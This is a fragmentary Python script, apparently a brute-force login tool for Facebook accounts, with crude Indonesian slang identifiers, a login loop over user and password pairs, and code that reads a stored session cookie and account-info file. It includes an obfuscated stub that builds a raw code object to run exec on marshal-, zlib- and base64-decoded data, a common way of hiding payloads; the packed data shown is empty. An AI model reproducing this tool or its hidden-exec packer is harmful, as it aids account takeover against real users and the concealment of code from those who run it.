...
class ngentod:
	...
	def __Njir__(self,user,pw,_anjay):
		...
		kontol=ses.get(f"{_anjay}/login/?next&ref=dbl&refid=8",allow_redirects=False)
...
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
if __name__=="__main__":
	try:
		kueh={"cookie":open("cookie","r").read().strip()}
		...
		while True:
			...
			if a in[""," "]:
				...
				asup(a).login()
	try:
		tentang=json.loads(open("my_info","r").read())
	except FileNotFoundError:
